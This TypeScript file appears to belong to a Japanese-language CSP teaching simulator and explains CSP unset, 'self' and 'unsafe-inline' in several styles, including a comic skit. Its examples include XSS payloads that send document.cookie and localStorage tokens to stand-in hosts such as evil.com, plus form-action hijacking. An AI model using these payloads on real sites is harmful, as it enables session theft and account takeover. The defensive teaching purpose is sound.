import type { ExplanationSet } from '../types/simulator'

export function getCspNoneExplanations(): ExplanationSet {
  return {
    friendly: {
      message: '警告: CSP未設定 (すべてのスクリプトが実行されます)',
      details: `Content-Security-Policy ヘッダーがないと、ブラウザは「制限なし」と判断します。つまり、インラインスクリプト、外部CDN、eval() すべてが許可され、XSS に対して無防備です。

典型的な被害例:
1. 攻撃者がコメント欄などから <script>alert('XSS')</script> を投稿。
2. サーバーがサニタイズし損ねると、そのままユーザーのブラウザで実行。
3. Cookie を盗んだり、フォーム送信先を書き換えたりできます。

擬似コード (CSPなしページ):
\`\`\`html
<!-- HTTPヘッダー: Content-Security-Policy が存在しない -->
<script>
  const token = document.cookie
  fetch('https://evil.example.com/log', {
    method: 'POST',
    body: token
  })
</script>
\`\`\`

防御策: Content-Security-Policy ヘッダーを追加し、少なくとも script-src を設定しましょう。Helm や nginx で簡単に追加できます。

参考リンク:
・MDN: https://developer.mozilla.org/ja/docs/Web/HTTP/CSP
・OWASP Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
・YouTube: Troy Hunt「Practical Content Security Policy」https://www.youtube.com/watch?v=kw1-dS1fLwM`
    },
    strict: {
      message: 'セキュリティリスク: CSP未設定',
      details: `仕様: CSP ヘッダーが存在しない場合、User Agent は default allow list を適用し、すべてのスクリプト/スタイル/画像を許可します。
https://www.w3.org/TR/CSP3/

ブラウザ内部:
• policy container に空の指示が登録され、script-src は "*" 相当になります。
• DevTools > Security では "Content Security Policy is not set" と警告が表示されます (Chrome)。
• レポート機能 (report-to/report-uri) も設定されないため、違反検知もできません。

結果: XSS、DOM Clobbering、データインジェクションのリスクが増大します。`
    },
    scenario: {
      message: '実例説明',
      details: `例1: 某SNSサイトがCSP未設定のまま運用していたところ、掲示板機能に \`<script>location='https://evil.com?c='+document.cookie</script>\` が投稿され、訪問者全員のセッションCookieが盗まれました。

例2: 企業の問い合わせフォームがサニタイズ不足でCSPも無し。攻撃者が \`<img src=x onerror=eval(atob('...'))>\` で難読化したスクリプトを仕込み、管理者ログイン情報を窃取。

例3: WordPressプラグインの脆弱性でインラインスクリプト挿入が可能に。CSP未設定のため \`<script>document.forms[0].action='https://phishing.com'</script>\` でフォーム送信先を改ざんされ、個人情報が流出。

攻撃例: 彼女ちゃん（ブラウザ）がCSP（守護神）不在の部屋に入ると、チャラ男くん（XSS攻撃）が仕込んだスクリプトが実行され放題。個人情報が全部見られ、勝手に操作されてしまいます。`
    },
    javascript: {
      message: 'JavaScript説明: CSP無しの危険性',
      details: `\`\`\`html
<!-- CSP未設定のページ -->
<!DOCTYPE html>
<html>
<head>
  <!-- Content-Security-Policy ヘッダーなし -->
</head>
<body>
  <!-- ユーザー入力がサニタイズされずに埋め込まれる -->
  <div id="comment">
    <!-- 攻撃者が投稿したコメント -->
    <script>
      // このスクリプトがそのまま実行される
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify({
          cookie: document.cookie,
          localStorage: localStorage.getItem('token')
        })
      })
    </script>
  </div>
</body>
</html>
\`\`\`

CSPがないため、ブラウザは何の制限もなくスクリプトを実行します。`
    },
    charaboy: {
      message: 'チャラ男説明: CSP無しは鍵開けっ放し',
      details: `**彼氏くん見てる〜？CSP無しとか最高だわ〜♪**

チャラ男くん「いやぁ〜彼氏くん、CSP設定してないとか神かよ！俺がXSSスクリプト（合鍵）仕込んだら、**彼女ちゃんのブラウザで何でもやり放題じゃん♡** Cookie盗み放題、フォーム改ざんし放題〜」

彼女ちゃん「え…？CSPって何…？」

彼氏くん「Content-Security-Policyっていう、スクリプトの実行を制限する仕組みだけど…**設定してなかった！**」

チャラ男くん「コメント欄に \`<script>fetch('https://evil.com?c='+document.cookie)</script>\` って書いといたから、**彼女ちゃんが見た瞬間にCookie全部俺のとこに送られてきたわ〜** セッションハイジャックして、彼女ちゃんになりすまして遊んじゃお♡」

彼女ちゃん「わ、わたしの情報が…勝手に…？」

彼氏くん「**くそ！CSP設定しないと彼女が危ない！**」

チャラ男くん「**彼氏くん、このまま放置しといてくれよ〜** 彼女ちゃんのアカウント、完全に俺のものにしちゃうからさ♡ じゃーね〜」`
    }
  }
}

export function getCspSelfExplanations(): ExplanationSet {
  return {
    friendly: {
      message: '成功: 同一オリジンのスクリプトのみ許可',
      details: `script-src 'self' を設定すると、自分のオリジンから提供するスクリプトだけ実行できます。インラインスクリプトや外部 CDN は拒否されるため、XSS の攻撃面を大幅に削減できます。

挙動:
• /static/app.js のような同一オリジンのファイル → 実行許可
• <script>alert('XSS')</script> のようなインライン → ブロック (Console にエラー)
• https://cdn.example.com/react.js → ネットワークは成功しても実行は拒否

擬似コード (ヘッダー例):

\`\`\`http
Content-Security-Policy: script-src 'self'
\`\`\`

不足する機能 (インラインイベントなど) が必要な場合は、nonce や hash を使って最小限のみ許可するのが推奨です。

参考リンク:
・MDN: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/script-src
・web.dev: https://web.dev/strict-csp/
・YouTube: https://www.youtube.com/watch?v=sPO65C7jrXk`
    },
    strict: {
      message: 'CSP有効: 同一オリジンのみ許可',
      details: `仕様: script-src 'self' は、同一オリジンからのスクリプトのみを allow-list に残します。
https://www.w3.org/TR/CSP3/#directive-script-src

ブラウザ内部:
• policy container に self-origin を登録し、その他の origin は violation として破棄。
• inline script, event handler, javascript: URL は hash/nonce が無い限り拒否されます。
• eval()/new Function() は 'unsafe-eval' が無いため TypeError を投げます。

DevTools:
• Console に「Refused to load the script because it violates the following Content Security Policy directive: \"script-src 'self'\"」が記録。
• Network パネルの Status 列に (blocked:csp) が表示。

効果まとめ:
• 同一オリジンの外部スクリプト: ✓
• インラインスクリプト: ✗
• eval()/new Function(): ✗
• 外部CDN: ✗`
    },
    scenario: {
      message: '実例説明',
      details: `例1: 某ニュースサイトが \`script-src 'self'\` を設定。攻撃者がコメントに \`<script>alert('XSS')</script>\` を投稿したが、CSPによりブロックされ、被害ゼロ。

例2: ECサイトが同一オリジンポリシー採用。攻撃者が外部CDN（https://evil.com/steal.js）へのscriptタグを挿入しようとしたが、CSPで拒否され情報漏洩を防止。

例3: SaaSアプリが \`script-src 'self'\` 設定。開発者がうっかりインラインスクリプト \`<button onclick="...">\` を追加したところ、本番環境でCSP違反エラーが発生し、即座に問題を発見。

攻撃例（防御成功）: チャラ男くん（XSS）が彼女ちゃん（ブラウザ）に外部スクリプト（evil.comの罠）を読ませようとするが、CSP（門番）が「'self'以外ダメ！」とブロック。彼女は守られました。`
    },
    javascript: {
      message: 'JavaScript説明: selfポリシーの動作',
      details: `\`\`\`http
Content-Security-Policy: script-src 'self'
\`\`\`

\`\`\`html
<!-- 許可される -->
<script src="/static/app.js"></script>

<!-- ブロックされる -->
<script>alert('inline')</script>
<!-- Console: Refused to execute inline script -->

<!-- ブロックされる -->
<script src="https://cdn.example.com/lib.js"></script>
<!-- Console: Refused to load script from 'https://cdn.example.com/lib.js' -->

<!-- ブロックされる -->
<button onclick="doSomething()">Click</button>
<!-- Console: Refused to execute inline event handler -->
\`\`\`

同一オリジンのスクリプトファイルのみ実行可能です。`
    },
    charaboy: {
      message: 'チャラ男説明: selfで門前払い',
      details: `**彼氏くん見てる〜？CSP 'self'とか邪魔すぎ！**

チャラ男くん「ちっ…彼氏くんが \`script-src 'self'\` 設定しやがって。俺が仕込んだ \`<script src="https://evil.com/steal.js"></script>\` がCSP（門番）に止められたわ」

彼女ちゃん「え…？チャラ男くんが何か仕込んでたの…？」

彼氏くん「当たり前だ。外部スクリプトは全部ブロックする設定にしてる」

チャラ男くん「くっそ〜。**彼女ちゃんのブラウザで俺のスクリプト動かして、Cookie盗もうと思ったのに**。同一オリジン（myapp.com）のスクリプトしか動かないとか、ガチガチすぎるわ」

彼女ちゃん「ブラウザさんが…守ってくれたの…？」

彼氏くん「CSPが外部スクリプトを拒否してくれた。安全だ」

チャラ男くん「チッ…今回は諦めるけど、**もし彼氏くんがXSS脆弱性放置してたら、myapp.comにスクリプト仕込んで彼女ちゃんのデータ、全部もらっちゃうからな**♡ じゃーね〜」`
    }
  }
}

export function getCspUnsafeInlineExplanations(): ExplanationSet {
  return {
    friendly: {
      message: '警告: インラインスクリプトを許可（推奨されません）',
      details: `script-src 'unsafe-inline' を追加すると、すべてのインライン <script>、onclick ハンドラ、javascript: URL が復活します。開発中は便利でも、本番で有効にすると XSS がそのまま通ります。

例:
• <button onclick="submitForm()"> がそのまま実行
• <a href="javascript:steal()"> も許可
• CMS の WYSIWYG から混入した <script>alert('XSS')</script> も実行

擬似コード:
\`\`\`http
Content-Security-Policy: script-src 'self' 'unsafe-inline'
\`\`\`

安全にインラインスクリプトを使いたい場合は nonce か hash を利用する方法を検討してください。

参考リンク:
・MDN: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe-inline
・Google Web Fundamentals: https://web.dev/strict-csp/#avoid-unsafe-inline
・YouTube: LiveOverflow「Why unsafe-inline is dangerous」https://www.youtube.com/watch?v=wjQ7r17m3WM`
    },
    strict: {
      message: 'CSP弱体化: unsafe-inlineは非推奨',
      details: `仕様: 'unsafe-inline' は inline スクリプト、イベントハンドラ属性、javascript: URL を全許可します。
https://www.w3.org/TR/CSP3/#unsafe-inline

ブラウザ内部:
• parser inserted script は即座に評価され、CSP 違反として記録されません。
• SecurityPolicyViolationEvent は発生せず、report-only ポリシーでも検知困難です。
• Trusted Types を併用しない限り、DOM XSS を防ぐ術がなくなります。

影響:
• <script>alert('XSS')</script>: ✓ 実行
• <button onclick="...">: ✓ 実行
• javascript:alert(1): ✓ 実行
• eval(): ✗ (unsafe-eval が別途必要)

推奨: nonce や hash を使って必要最小限のインラインコードのみ許容してください。`
    },
    scenario: {
      message: '実例説明',
      details: `例1: レガシーシステムが \`'unsafe-inline'\` 設定のまま運用。攻撃者がお問い合わせフォームに \`<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">\` を挿入し、管理者のCookieを窃取。

例2: WordPress CMSで \`unsafe-inline\` を許可。プラグインの脆弱性から \`<script>document.location='https://phishing.com'</script>\` が埋め込まれ、訪問者が詐欺サイトへリダイレクト。

例3: 社内Wikiが開発の都合で \`unsafe-inline\` 有効化。退職した元社員が仕込んだ \`<button onclick="stealData()">クリック</button>\` が残り続け、機密情報が外部流出。

攻撃例: チャラ男くん（XSS）がインラインスクリプトという隠し部屋の合鍵を手に入れ、彼女ちゃん（ブラウザ）の部屋に自由に出入りできる状態。個人情報を好き放題持ち出せます。`
    },
    javascript: {
      message: 'JavaScript説明: unsafe-inlineの危険性',
      details: `\`\`\`http
Content-Security-Policy: script-src 'self' 'unsafe-inline'
\`\`\`

\`\`\`html
<!-- すべて実行される -->
<script>alert('inline script')</script>

<button onclick="doSomething()">Click</button>

<a href="javascript:stealCookie()">Link</a>

<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
\`\`\`

攻撃者が挿入したインラインスクリプトが全て実行されてしまいます。nonceやhashを使うのが推奨です。`
    },
    charaboy: {
      message: 'チャラ男説明: unsafe-inlineで侵入成功',
      details: `**彼氏くん見てる〜？unsafe-inlineとか最高すぎ♪**

チャラ男くん「いやぁ〜彼氏くん、\`unsafe-inline\` 許可してくれてサンキュー！俺がコメント欄に \`<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">\` 仕込んだら、**彼女ちゃんが見た瞬間にCookie全部送られてきたわ〜♡**」

彼女ちゃん「え…？画像が壊れてるだけだと思ってたのに…」

彼氏くん「**くそ！インラインスクリプト許可してたから、onerrorイベントが動いた！**」

チャラ男くん「そうそう♪ \`unsafe-inline\` があると、俺のXSSスクリプトがやり放題なんだよね〜。**彼女ちゃんのセッション乗っ取って、好き勝手しちゃうわ**。メールも見れちゃう、パスワードも変更できちゃう♡」

彼女ちゃん「わ、わたしのアカウントが…勝手に…？」

彼氏くん「**nonce使うべきだった…！**」

チャラ男くん「**彼氏くん、このまま unsafe-inline 使っといてね〜** 彼女ちゃん、完全に俺のものにしちゃうから♡ じゃーね〜」`
    }
  }
}
